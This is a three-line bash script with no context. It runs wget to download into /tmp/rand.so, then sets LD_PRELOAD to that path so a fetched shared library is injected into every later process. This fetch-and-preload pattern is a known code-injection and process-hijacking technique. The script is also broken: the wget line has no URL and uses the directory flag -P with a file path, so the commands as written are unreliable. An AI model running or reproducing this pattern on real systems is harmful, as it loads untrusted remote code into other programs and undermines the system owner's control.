#!/bin/bash
wget -P /tmp/rand.so 
export LD_PRELOAD=/tmp/rand.so
